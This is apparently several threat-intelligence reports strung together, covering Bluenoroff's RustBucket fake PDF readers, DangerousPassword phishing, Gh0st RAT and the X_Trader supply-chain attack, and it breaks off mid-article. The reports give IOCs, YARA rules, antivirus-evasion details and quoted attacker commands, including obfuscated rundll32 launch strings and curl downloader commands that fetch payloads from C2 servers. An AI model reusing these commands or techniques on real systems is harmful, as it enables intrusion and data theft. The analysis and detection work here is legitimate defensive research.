This new technique is interesting as it makes it more complex to track. We need to find the fake readers and the right PDF file to get relevant results from sandboxes. While the usage of a modified PDF reader was already observed during Lazarus’ DreamJob campaign in 2020, it is the first time we observe it to target macOS. Sekoia.io analysts created YARA rules and collected new samples complementing Jam’s findings, available in the IOCs section.
Looking through the Window(s) pane
During our investigation on the macOS variant, Sekoia.io analysts identified a .NET version of RustBucket, with a similar GUI, developed using the library DevExpress.XtraPdfViewer. The malware was embedded in a ZIP archive containing the PDF reader and the “key” PDF requiring user interaction.
 
Figure 2. Windows RustBucket archive’s content
Similarly to the RustBucket macOS version, when the user opens the PDF file in another PDF reader, it opens a one-pager with a message stating the file is protected and must be opened with the “internal” reader. When the file is opened with the fake PDF reader, it prints a sixteen pages document containing a list of contacts.
 
Figure 3. (left) Key PDF document opened in Firefox, (right) Key PDF document opened in the Internal PDF viewer
During our analysis, we observed that both Windows and MacOS RustBucket’s versions use the same decryption key. The executable PdfViewer.exe decrypts the malicious PDF and calls the Create function of the DevExpress.Xpo.v19.2.dll Library with the C2 url as parameter (if a legitimate PDF is chosen, an error is returned ”Can’t decrypt PDF file”). Then two other DLLs are also used to load the backdoor, as detailed here above and in Figure 4.

PdfViewer/DevExpress.Xpo.v19.2.dll
The purpose of this DLL is to retrieve the process ID of an explorer.exe process. Then, the function Create of the DevExpress.XtraList.v19.2.dll library is called with the URL and the process ID as parameters.
PdfViewer/DevExpress.XtraList.v19.2.dll
The purpose of this DLL is to load and call the DevExpress.Xpr.v19.2.dll library. This DLL checks for some antivirus on the infected machine: Bitdefender, Kaspersky, Sophos, AvastSvc, Norton, Avira, AVG and WindowsDefender. If one of this antivirus is found, the DLL call the OpenProcess API to run the following command:
rundll32.exe %s\DevExpress.Xpr.v19.2.dll,Update
If there is no antivirus, the DLL perform code injection on the provided explorer.exe process. The injected payload starts by decrypted itself into the DevExpress.Xpr.v19.2.dll.
DevExpress.Xpr.v19.2.dll
This DLL is called via the Update function which gives back the execution flow to the DLLMain function with 0xD8E1 as reason code (instead of 0, 1, 2 or 3). Then a new thread is created. This backdoor collects information about the compromised machine (name, active processes, network configuration, etc.) and sends this information to the C2 using POST requests. It also has the capability to load a next stage (we assess that this next stage is provided by the C2).
The backdoor collects information about the compromised machine and the active processes and sends this information to the C2 using POST requests.
 
Figure 4. Windows RustBucket execution flow chart
Pivoting on the infrastructure
Pivoting on the infrastructure used to deliver RustBucket, Sekoia.io analysts retrieved additional infrastructure not exclusively related to the RustBucket activity that we associate to Bluenoroff with high confidence, used to deploy other malware through several infection chains. These infection chains notably include LNK, MSI, OneNote and VHD files. It is possible Bluenoroff is testing new infection chains and malware before shifting or expanding their TTPs.
Bluenoroff’s observed initial intrusion vector includes phishing emails, as well as leveraging social networks such as LinkedIn. During our investigations, we identified the domain sarahbeery.docsend[.]me, further analysis led us to the following LinkedIn profile:
 
Figure 5. LinkedIn profile allegedly used by Bluenoroff
As of the time of writing, TDR analysts could no longer find this profile on LinkedIn. We assess this likely was a profile used by Bluenoroff after it was leaked to engage with their targets, possibly followed up by a delivery of malicious documents through the docsend sharing platform.
While Bluenoroff was seen leveraging updated VHD and CAB files to bypass the Mark-of-the-Web (MOTW) flag until the end of 2022, Sekoia.io did not observe these TTPs in 2023. It is almost certainly a reflection of Bluenoroff’s adaptation efforts after their TTPs were documented in open source, notably by Securelist. In March 2023, we observed new files (MSI file: 5c483473641807082e530744023044fd and One Note file: 4e05597d308d2368625dc19e86a9ca22) containing similar commands to those used in the VHD files reported by Kaspersky.
Those files were used to drop and execute 529c65521e8a07c8810b6d225f7e2a89 which is a downloader for a curl-agent that Sekoia.io analysts did not retrieve at the time of writing.
cmd.exe /c copy /b %s\system32\rund^ll3^2.e^xe %s\rdl.e^xe & %s\rdl.ex^e %s #1 %S
cmd /c timeout /t 10 & Del /f /q “%s” & attrib -s -h “%s” & rundll32 “%s” #1 %S
cmd /c timeout /t 10 & rundll32 “%s” #1 %S
curl -A cur1-agent -L %s -s -d dacurl -A cur1-agent -L %s -s -d dl
As per Sekoia.io analysts’ observations, the network infrastructure is used to host HTTP/HTTPS services leveraged by lure files. This infrastructure is used to download a later stage malware which often is a VBS acting as a backdoor, or a curl-agent downloader. During their investigation, Sekoia.io analysts created automatic trackers to monitor Bluenoroff’s infrastructure evolution. In previous activities, the intrusion set setup HTTP/HTTPS servers with specific characteristics used to host a dozen domains notably typosquatting IT, financial and investment companies.
Based on a TDR heuristic, we identified servers used to host domain typo-squatting legitimate organisations, notably pertaining to entities involved in fund management and venture fund, crypto assets and blockchain, located in Europe, Asia, and North America.
 
Figure 6. Financial and technology entities typo-squatted by Bluenoroff
Based on previous open source publications and our own knowledge of this intrusion set, we associate these domains to Bluenoroff with high confidence. A list of retrieved typosquatting domains is available to Sekoia.io’s customers in the Intelligence Center.
Whether Bluenoroff’s attempt to target these entities or simply masqueraded as those entities to target other individuals and / or organizations remains an intelligence gap at the time of writing. Regardless, Sekoia.io TDR analysts assess this is in line with past Bluenoroff’s activities, targeting finance-related institutions. Based on typosquatting domains and Sekoia.io attributed levels of confidence, we identified a strong focus on Asia and the U.S.. While this almost certainly stems from the fact that these regions are particularly active in the Fintech area, it is also likely part of Bluenoroff’s geographical targeting assignment. We also retrieved domains indicating a targeting of Laos and Thailand.
 
Figure 7. Bluenoroff targets since September 2022
Of note, we also observed that the group may use temporary C2 servers, when testing new techniques, that they then discard rapidly. For instance, in November 2022, Bluenoroff temporarily used a server to transition to using MSI and CAB files (149.28.247[.]34). Similarly, the intrusion set sporadically used a specific server when experimenting with chm (Windows Helper) files (172.86.122[.]181) in December 2022.
Conclusion
Sekoia.io analysts assess this activity is part of Bluenoroff’s SnatchCrypto campaign, active since 2017. It is in line with past observed malicious cyber activities, notably pertaining to Pyongyang’ strategic objective of revenue generation to evade sanctions. Of particular interest are Bluenoroff’s observed efforts to develop their offensive capabilities, notably including crossplatform languages to their toolset, and expanding their victimology through the targeting of multiple environments. Sekoia.io analysts assess Bluenoroff’s activities will almost certainly continue in the short to medium term.
IoCs & Technical Details
Samples’ first seen date relates to the time they were first submitted to VirusTotal. Of note, a few samples we identified were tagged as NukeSped in open source, likely due to the confusion between Lazarus and Bluenoroff activities. At the time of writing, Sekoia.io analysts consider NukeSped to be a Lazarus signature malware. IOCs provided in Appendix are all associated to Bluenoroff with high confidence.

RustBucket MacOS version
2023-05-08
Jump Crypto Investment Agreement.zip
ba5e982596fd03bea98f5de96c1258e56327358e134ceecd1d68e54480533d92
Internal PDF Viewer.app.zip
3ed9f34fedca38130776e5adabae363ac797fe89087e04e0c93d83fd62a7a9a4
ZIP
6ca3a2f4cef27dac9d28c1ec2b29a8fa09dfc6dbbaf58e00dddbf5c1dd3b3cc3
Mach-O - Internal PDF Viewer
c28e4031129f3e6e5c6fbd7b1cebd8dd21b6f87a8564b0fb9ee741a9b8bc0197
Mach-O
e2f177b8806923f21a93952b61aedbeb02d829a67a820a7aab5ee72512e3d646
Mach-O
d6d367453c513445313be7339666e4faeeebeae71620c187012ea5ae2901df34
PDF - Jump Crypto Investment Agreement.pdf (Key PDF)
5f00106f7f15e0ca00df4dbb0eeccd57930b4b81bc9aa3fca0c5af4eda339ab7
PDF - Readme.pdf (Instruction to use the fake reader)
ebad7317e1b01c2231bdbf37dfebdf656e3c8706e719fd37b66f0170b3d5cae0
2023-05-02
ZIP Internal PDF Viewer.app.zip
dda8a9e2a2e415be781a39fdf41f1551af2344f1b1a0ddf921d8aeba90343d1b
Mach-O Internal PDF Viewer
46db9f2fc879bf643a8f05e2b35879b235cbb04aa06fe548f0bc7c7c02483cf3
Mach-O
5072b28399c874f92e71793fa13207d946a28a2f5903365ac11ddf666d15d086
Mach-O
3f0d5ddca2657044f4763ae53c4f33c8a7814ba451b60d24430a126674125624
2023-04-23
ZIP - Internal PDF Viewer 2.app.zip
61772375af1884fe73c5d154b8637dd62f26d23bc38d18462a88e2bbed483fd7
SCPT - main.scpt
7c66d2d75be43d2c17e75d37c39344a9b5d29ee5c5861f178aa7d9f34208eb48
cloud.dnx[.]capital
104.255.172[.]56
ZIP - Internal PDF Viewer.zip
ff8832355ae99ffd66d0fe9eda2d74efdf3ed87bb2a4c215b93ade93165f7c0b
ZIP - Internal PDF Viewer.app.zip
83f457bc81514ec5e3ea123fc237811a36da6ce7f975ad56d62e34af4d1f37c0
ZIP - Internal PDF Viewer 3.app.zip
b68bf400a23b1053f54911a2b826d341f6bf87c26bea5e6cf21710ee569a7aab
Mach-O - PdfWriter
3b6f30369a4ee8bf9409d141b6d1b3fb4286c34984b5de005ed7431df549b17e
laos.hedgehogvc[.]us
104.255.172[.]56
2023-04-21
Mach-O - 703517604263
9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747
Mach-O
ec8f97d5595d92ec678ffbf5ae1f60ce90e620088927f751c76935c46aa7dc41
Mach-O
7fccc871c889a4f4c13a977fdd5f062d6de23c3ffd27e72661c986fae6370387
2023-03-02
ZIP - Internal PDF Viewer.app.zip
b448381f244dc0072abd4f52e01ca93efaebb2c0a8ea8901c4725ecb1b2b0656
ZIP - Pdf Viewer.zip
c56a97efd6d3470e14193ac9e194fa46d495e3dddc918219cca530b90f01d11e
Mach-O - Internal PDF Viewer
bea33fb3205319868784c028418411ee796d6ee3dfe9309f143e7e8106116a49
2023-02-13 (creation date 2022-12-20)
ZIP - Pdf Viewer.zip
0d6964fe763c2e6404cde68af2c5f86d34cf50a88bd81bc06bba739010821db0
ZIP - Internal PDF Viewer.app.zip
ea5fac3201a09c3c5c3701723ea9a5fec8bbc4f1f236463d651303f40a245452
ZIP - Internal PDF Viewer.app.zip
9525f5081a5a7ab7d35cf2fb2d7524e0777e37fe3df62730e1e7de50506850f7
Mach-O - Internal PDF Viewer
e74e8cdf887ae2de25590c55cb52dad66f0135ad4a1df224155f772554ea970c
Mach-O
38106b043ede31a66596299f17254d3f23cbe1f983674bf9ead5006e0f0bf880
Mach-O
7981ebf35b5eff8be2f3849c8f3085b9cec10d9759ff4d3afd46990520de0407
Windows version of RustBucket
ZIP - PdfViewer.zip
62a5c6a600051bca4f7b3d11508ca1f968006b71089c71bf87b83ea8b34188e3
PDF - DOJ Report on Bizlato Investigation.pdf
8e234482db790fa0a3d2bf5f7084ec4cfb74bffd5f6cbdc5abdbc1350f58e3fe
DLL - DevExpress.Xpr.v19.2.dll
f603713bffb9e040bedfd0bb675ff5a6b3205d8bd4e1a3309ea6d1b608871184
DLL - DevExpress.XtraList.v19.2.dll
31cec2803bfc7750930d5864400388732a822da96c3f79c98ddee03949aa6a2d
EXE - PdfViewer.exe
b3cb7d0b656e8e4852def8548d2cf1edc4e64116434e1f2d9c9b150ee0f9861e
safe.doc-share[.]cloud
172.93.181[.]221
Key PDF file 2
PDF - DOJ Report on Bizlato Investigation_asistant.pdf
07d206664a8d397273e69ce37ef7cf933c22e93b62d95b673d6e835876feba06
safe.doc-share[.]cloud

IP and domains
Active Bluenoroff C2 servers
104.156.149[.]130 (2023-04-18 - today)
104.255.172.52 (2023-03-18 - today)
104.234.147[.]28 (2023-01-21 - today)
104.168.138.7 (2023-03-17 - today)
104.168.167[.]88 (2022-10-17 - today)
155.138.159.45 (2022-09-20 - today)
Inactive servers
104.255.172[.]56 (2022-09-15 - 2023-04-11)
172.93.181[.]221 (2022-12-28 - 2023-03-06)
172.86.121[.]143 (2022-10-31 - 2022-12-21)
172.86.121[.]130 (2022-10-25 - 2023-01-24)
149.28.247[.]34 (2022-11-11 - 2022-11-11)
152.89.247[.]87 (2022-09-15 - 2022-10-24)
104.168.174[.]80 (2022-06-28 - 2022-09-16)
149.248.52[.]31 (2022-08-05 - 2022-08-31)
155.138.219[.]140 (2022-07-17 - 2022-08-16)
YARA rules
rule apt_Bluenoroff_downloader_mac_RustBucket {
    meta:
   	 id ="5a003b68-ad9a-47f9-b157-dd898181dac2"
   	 version = "1.0"
   	 malware = "RustBucket"
   	 description = "RustBucket fake PDF reader"
   	 source = "SEKOIA"
   	 creation_date = "2023-04-24"
   	 classification = "TLP:WHITE"
   	 reference = "https://tinyurl.com/5n7f56a8"
   	 hash = "606bce13161693844b9eb36c96554883"
   	 hash = "b93d7b7b30207249c1c683df16bad107"
   	 hash = "ca86579220eecfaede268d1520d07fae"
   	 hash = "f8800dd176487601ccf2e27c094b297b"
    strings:
   	 $down_exec1 = "_down_update_run" nocase
   	 $down_exec2 = "downAndExec" nocase
   	 $encrypt1 = "_encrypt_pdf"
   	 $encrypt2 = "_encrypt_data"
   	 $error_msg1 = "_alertErr"
   	 $error_msg2 = "_show_error_msg"
   	 $view_pdf1 = "-[PEPWindow view_pdf:]"
   	 $view_pdf2 = "-[PEPWindow viewPDF:]"
    condition:
   	 (uint32be(0) == 0xcafebabe or uint32be(0) == 0xcffaedfe)
   	 and 5 of them
   	 and filesize > 50KB
}

rule apt_Bluenoroff_implant_mac_RustBucket: TESTING {
    meta:
   	 id = "fcbb745d-7f56-4c51-9db5-427da22a0c68"
   	 version = "1.0"
   	 malware = "RustBucket"
   	 description = "Detect the RustBucket malware"
   	 source = "SEKOIA"
   	 creation_date = "2023-04-24"
   	 classification = "TLP:WHITE"
   	 hash = "f90b544f89cfbe38aee18024d7c39e40"
   	 reference = "https://tinyurl.com/5n7f56a8"
    strings:
   	 $ = "/Users/hero/"
   	 $ = "PATHIpv6Ipv4Bodyslotpath"
    condition:
   	 (uint32be(0) == 0xcafebabe or uint32be(0) == 0xcffaedfe) and all of them
}

rule apt_Bluenoroff_downloader_win_curl_agent: TESTING {
    meta:
   	 id = "ddeb2d8f-1b10-4a33-b768-d19412e8551a"
   	 version = "1.0"
   	 intrusion_set = "Bluenoroff"
   	 description = "Detect the downloader used by Bluenoroff to install it CurlAgent"
   	 source = "SEKOIA"
   	 creation_date = "2023-05-02"
   	 classification = "TLP:WHITE"
    strings:
   	 $ = "%s\\marcoor.dll" wide
   	 $ = "curl -A cur1-agent -L %s -s -d dl"
   	 $ = "curl -A cur1-agent -L %s -s -d da"
   	 $ = "cmd /c timeout /t 10 & rundll32 \"%s\" #1" wide
   	 $ = "cmd /c timeout /t 10 & Del /f /q \"%s\" & attrib -s -h \"%s\" & rundll32 \"%s\" #1" wide
    condition:
   	 3 of them
}

Appendix 1. Bluenoroff’s infection chain.
The classical infection chain observed is ZIP > LNK & PDF
As part of their phishing activities, Bluenoroff’s operators send their targets a ZIP archive. The archive contains a non-malicious PDF document and a LNK file masquerading as a TXT file purportedly containing a password to read the PDF, or masquerading as a PDF reader. Launching the LNK file results in downloading a Javascript file from Bluenoroff-controlled C2 server and executing it using mshta.exe. The downloaded file is an obfuscated Javascript:
•	5ca7c871dfe24b27b5cf7e9bf087f44c7620d78a1d4fa76373f22abedbdf8f82
The obfuscation method is straightforward and consists in encoding some characters in UTF-8 and Hex. This script decodes its base64 block, writes it in a file ”tyrbz.js” and runs it with a command line containing the C2 domain as argument. The base64 encoded part is a script dropped on the computer and executed with the C2 domain as argument. The script requests the domain using an HTTP POST request, decodes the base64 encoded response and executes it using ‘eval()‘. The script attempts to contact the C2 server every 15 seconds and acts as a backdoor, allowing the attacker to send commands and scripts to be executed. While we identified a few changes in 2023, this infection chain remains the most frequently observed.
 
Attack Trends Related to the Attack Campaign DangerousPassword
•	
 
•	email
JPCERT/CC has been conducting an attack campaign since June 2019 on the DangerousPassword attack(also known as CryptoMimic or SnatchCrypto) and are aware of attacks on cryptocurrency exchange operators. Attackers have been using an attack method for many years to infect the target by sending a shortcut file to the target by e-mail, but it has been found that they are aiming for malware infection while conducting various other patterns of attacks. In this article, we will introduce the recently observed attack method of DangerousPassword.
In this article, we will introduce the following four attack patterns.
•	Attack sending malicious CHM files from Linkedin
•	Attacks using OneNote files
•	Attacks using Virtual Hard Disk files
•	Attacks targeting macOS
Attacks that send fraudulent CHM files from LinkedIn
In addition to sending malware via email attachments, attackers can also contact you on LinkedIn and send you malware. Figure 1 shows how malware sent via LinkedIn infects a host.
 Figure 1: Malware Infection Flow
Files sent via LinkedIn are compressed in RAR format and contain Windows help files (CHM files) when extracted. When you run this file, it downloads and runs a Windows Installer file (MSI file) from the outside. The executed MSI file uses a PowerShell script to download and execute additional MSI files from the outside (Administrator-a214051 .msi in Figure 1, and the file name is . This MSI file has the ability to send information about the infected host, and it sends the information in an HTTP POST request as shown below. The information of the infected host to be sent is Base64 encoded.[実行したユーザー名]-a[ランダムな数字5桁]1.msi
POST /test.msi HTTP/1.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Accept: */*
Accept-Language: ja-JP
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Content-Length: 8708
Host: [サーバー名]

VGltZToJV2VkIERl(...)
Figure 2 shows a piece of code that the malware collects information about the infected host. You can see that it is written in JScript.
 Figure 2: Part of the malware's code
In addition, we have confirmed that the LinkedIn account that contacts the target sends malware to the target under the guise of contacting job information. Figure 3 shows the LinkedIn accounts that have been contacted by the target, but it is believed that these accounts have also been taken over by the attackers. As of now, it's unclear how attackers could take over social media accounts.
 Figure 3: Example of a LinkedIn account abused by an attacker
Attacks using OneNote files
The method of abusing OneNote files to infect them with malware has been confirmed by Emotet and others, and is becoming a standard type of attack that spreads infection from email attachments. DangerousPassword uses a similar attack method, sending a malware-embedded OneNote file as shown in Figure 4 and trying to infect the user by clicking on the icon that appears when viewing the OneNote file (an icon that looks like a PDF file in Figure 4).
 Figure 4: Example of OneNote File
The malware embedded in the OneNote file is an MSI file, which stores the DLL file on the host and executes it. The DLL file downloads the malware using the curl command below.
curl -A cur1-agent -L [URL] -x [Proxy] -s -d dl
In addition, this malware has the function of detecting antivirus software as shown in Figure 5.
 Figure 5: Part of the code that detects antivirus software
If the following anti-virus software is detected, it will try to escape the monitoring of the anti-virus software by releasing the hook to the NTDLL[1], change the data (or) sent when executing the curl command, or change the method of executing the downloaded malware (injection into Explorer or rundll32) or change the behavior on the host.dlda
•	Avast
•	Avira
•	Bitdefender
•	Kaspersky
•	Sophos
•	Trend Micro
•	Windows Defender
Attacks using Virtual Hard Disk files
In addition to compressing the malware in ZIP or RAR format or including it in an ISO file, attackers may also include it in a virtual hard disk file (VHD file). VHD files are saved as files for use on hard disks in Hyper-V, a virtualization technology, and can be mounted by double-clicking on Windows OS. Figure 6 shows a VHD file containing malware mounted. Inside it is a PDF file of the decoy, the main malware (DLL file) and the executable file (EXE file) to launch the DLL file.
 Figure 6: Example of mounting a VHD file
The DLL file is a malware that has the same functionality as the malware contained in the OneNote file described in the previous section.
Attacks targeting macOS
We have observed that attackers are targeting macOS as well as Windows OS. Figure 7 shows the file structure of malware targeting macOS.
 Figure 7: Malware file structure
As shown in Figure 8, it contains an AppleScript that downloads and executes a malicious application using the curl command.main.scpt
 Figure 8: Incorrect AppleScript content
When you run the downloaded application, you will see a screen similar to the one shown in Figure 9. It has a function (Fig. 10) that XOR decodes the contents of the file to be read, downloads the file from the decoded communication destination, and executes it.
 Figure 9: Screen displayed when downloaded malware is executed
 Figure 10: Part of the code to download the file
For more information on this malware, please refer to Jamf's blog [2].
Conclusion
The targeted threat actor DangerousPassword continues to carry out attacks against cryptocurrency exchange operators in Japan. This threat actor may contact the target from LinkedIn, so be careful when using social media. macOS may also be targeted, so it's important to be vigilant if you're using it as well. Please refer to the Appendix for information on the communication destinations of the malware introduced in this article.
 
Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release
•	APRIL 24, 2023
Home » Blog » Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release
SHARE THIS ARTICLE
Facebook
Twitter
LinkedIn
Found in Environments Protected By: Proofpoint
By Nathaniel Raymond, Cofense Intelligence
Gh0st RAT, a decades-old open-source remote administration tool (RAT), recently appeared in phishing campaigns targeting a healthcare organization. Gh0st Remote Administration Tool was created by a Chinese hacking group named C. Rufus Security Team that released it publicly in 2008. The public release of Gh0st RAT source code made it easy for threat actors to obtain and tailor the tool to their needs. Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities:
•	Taking full control of the infected machine
•	Recording keystrokes in real time with offline logging available
•	Accessing live web cam feeds including microphone recording
•	Downloading files remotely
•	Remote shutdown and reboot
•	Disabling user input
Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media. One such breach was the operation known as “GhostNet” in 2009, in which a large-scale cyber-attack used Gh0st RAT to conduct surveillance and espionage. The breach impacted the Dalai Lama’s Tibetan exile centers in multiple countries.
Although Gh0st RAT was first identified in reports of threat activity almost 15 years ago, it is still actively distributed today. Cofense Intelligence identified an email targeting a European-owned medical technology organization located in China, attempting to deliver Gh0st RAT via an embedded link. The embedded link that hosted the malware was affiliated with Tencent and based in Hong Kong. The sample’s command and control (C2) server is also located on the CHINANET Jiangsu province network in the city of Nanjing.
 
Figure 1: A screenshot of the recent phishing email used to deliver Gh0st RAT via an embedded link.
 
Figure 2: A translation of the body of the recent Gh0st RAT campaign shows that it used an unpaid invoice as a theme.
Although Ghost RAT has a history of use by nation-state threat actors, Cofense Intelligence does not have conclusive evidence that this recent campaign is associated with known nation-state activity. The activity we observed activity shares certain characteristics with some advanced persistent threat (APT) groups, including APT27, which is known for intellectual property theft against healthcare and technology companies, and is also known for the use of Gh0st RAT. However, since Gh0st RAT’s source code is publicly available, it remains plausible that any threat actor could download and modify the code for their own needs. With Chinese universities (including more than one in Nanjing) being heavily involved in training talent for the Chinese defense industry, it is also plausible that students or other threat actors that are at times associated with APT groups may be carrying out independent threat activity using tools they are familiar with.
 
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan.
Indicators of Compromise
Files
1680478346389.zip
MD5: 9e6c45b6b8b20bf3c5959dbba8f27117
LiveUpdate360.dat
MD5: f149d3f3ef0361ebe4d346811f29b527
LiveUpdate.exe
MD5: 96e4b47a136910d6f588b40d872e7f9d
setting.ini
MD5: 91aab4bbe634be62d11d132738c23a82
SqlVersion9.dll
MD5: 317f9ff06c076e87e5b1d11242396d5f
ú¿╡τ-╫╙-╖ó-╞▒ú⌐.exe
MD5: 4723a2a8f68c1eaf82809cff29b8e56f
URLs
hxxps://api[.]youkesdt[.]asia/admin/down/hash/79b7c6ed-c4d8-4b36-b1cd-f968e6570010
hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/SqlVersion9[.]dll
hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/Media[.]xml
hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate360[.]dat
hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate[.]exe
hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/223[.]114[.]txt
Command and Control
hxxp://61[.]160[.]223[.]114:18076

 
POSTED: 21 APR, 20234 MIN READTHREAT INTELLIGENCE
 TRANSLATION: 日本語
 SUBSCRIBE
FOLLOW
twitterlinkedin
X_Trader Supply Chain Attack Affects Critical Infrastructure Organizations in U.S. and Europe
North Korean-linked operation affected more organizations beyond 3CX, including two critical infrastructure organizations in the energy sector.
The X_Trader software supply chain attack affected more organizations than 3CX. Initial investigation by Symantec’s Threat Hunter Team has, to date, found that among the victims are two critical infrastructure organizations in the energy sector, one in the U.S. and the other in Europe. In addition to this, two other organizations involved in financial trading were also breached.
As reported yesterday by Mandiant, Trojanized X_Trader software was the cause of the 3CX breach, which was uncovered last month. As a result of this breach, 3CX’s software was compromised, with many customers inadvertently downloading malicious versions of the company’s voice and video calling software DesktopApp. In addition to wider victims, Symantec has also discovered additional indicators of compromise, listed below.
It appears likely that the X_Trader supply chain attack is financially motivated, since Trading Technologies, the developer of X_Trader, facilitates futures trading, including energy futures. Nevertheless, the compromise of critical infrastructure targets is a source of concern. North Korean-sponsored actors are known to engage in both espionage and financially motivated attacks and it cannot be ruled out that strategically important organizations breached during a financial campaign are targeted for further exploitation.
Malicious Installer
The infection chain starts with the Trojanized installer named X_TRADER_r7.17.90p608.exe (SHA256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by "Trading Technologies International, Inc." and contains a malicious executable named Setup.exe. Our analysis of one version of this executable (SHA256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named X_TRADER-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000:
•	5E DA F3 76
If the marker bytes are present, it creates a folder named:
•	C:\Programdata\TPM
It then copies the file C:\Windows\Sysnative\immersivetpmvscmgrsvr.exe as C:\Programdata\TPM\TpmVscMgrSvr.exe to the new folder.
Next, it will drop two malicious DLLs:
•	C:\Programdata\TPM\winscard.dll (SHA256: cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2)
•	C:\Programdata\TPM\msvcr100.dll (SHA256: d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0)
The content of the dropped files is generated by decrypting chunks of the file X_TRADER-ja.mst mentioned earlier using the XOR algorithm with the following key:
•	74 F2 39 DA E5 CF
To achieve persistence on the victim’s system, the malware invokes a CLSID_TaskScheduler COM object, possibly to create a scheduled task to run periodically the following file:
•	C:\Programdata\TPM\TpmVscMgrSvr.exe
Setup.exe then drops a file named X_TRADER.exe, also contained within the installer. The content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1CB40 using the XOR algorithm with the following key:
•	74 F2 39 DA E5 CF
Setup will then execute X_Trader.exe before deleting itself.
Backdoor Installation
Once installed, the legitimate X_Trader executable side-loads the two malicious DLLs dropped by the installer. The first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). The msvcr100.dll file contains an encrypted blob appended to the file. The blob starts with the hex value FEEDFACE, which the loader uses to find the blob.
The process for payload installation is almost identical as that seen with the Trojanized 3CX app, where two side-loaded DLLs are used to extract a payload from an encrypted blob.
In this attack, the payload extracted is a modular backdoor called Veiledsignal (SHA256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). Veiledsignal contains another DLL (SHA256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. This can be injected into the Chrome, Firefox, or Edge web browsers. The module contains a second DLL (SHA256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (C&C) module. It connects to the following C&C URL:
•	https://www.tradingtechnologies.com/trading/order-management
Hydra-like Campaign
The discovery that 3CX was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. The attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out.
Protection/Mitigation
For the latest protection updates, please visit the Symantec Protection Bulletin.
Indicators of Compromise
If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.
900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6 - Trojanized installer (X_TRADER_r7.17.90p608.exe)
6e989462acf2321ff671eaf91b4e3933b77dab6ab51cd1403a7fe056bf4763ba – Possible Trojanized installer
aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43 - Malicious component of Trojanized installer (setup.exe)
6e11c02485ddd5a3798bf0f77206f2be37487ba04d3119e2d5ce12501178b378 - Malicious component of Trojanized installer (setup.exe)
47a8e3b20405a23f7634fa296f148cab39a7f5f84248c6afcfabf5201374d1d1 - Benign Windows executable used for side-loading (tpmvscmgrsvr.exe)
cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2 – Veiledsignal loader (winscard.dll)
277119738f4bdafa1cde9790ec82ce1e46e04cebf6c43c0e100246f681ba184e – Veiledsignal loader (devobj.dll)    
cb374af8990c5f47b627596c74e2308fbf39ba33d08d862a2bea46631409539f – Malicious DLL (msvcr100.dll)
d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0 – Malicious DLL (msvcr100.dll)
e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345 - Veiledsignal main component
19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae - Veiledsignal process-injection module
f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce - Veiledsignal communications module
https://www.tradingtechnologies[.]com/trading/order-management - Veiledsignal C&C server
\\.\pipe\gecko.nativeMessaging.in.foo8bc16e6288f2a -Veiledsignal named pipe
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40 - Veiledsignal user agent
 
April 21, 2023 by Jamf Threat Labs
BlueNoroff APT group targets macOS with ‘RustBucket’ Malware
Jamf Threat Labs
Learn about the macOS malware variant discovered by Jamf Threat Labs named 'RustBucket'. What it does, how it works to compromise macOS devices, where it comes from and what administrators can do to protect their Apple fleet.
By Ferdous Saljooki and Jaron Bradley
Jamf Threat Labs has discovered a macOS malware family that communicates with command and control (C2) servers to download and execute various payloads. We track and protect against this malware family under the name ‘RustBucket’ and suspect it to be attributed to a North Korean, state-sponsored threat actor. The APT group called BlueNoroff is thought to act as a sub-group to the well-known Lazarus Group and is believed to be behind this attack. This attribution is due to the similarities noted in a Kaspersky blog entry documenting an attack on the Windows side. These similarities include malicious tooling on macOS that closely aligns with the workflow and social engineering patterns of those employed in the campaign.
Stage-One
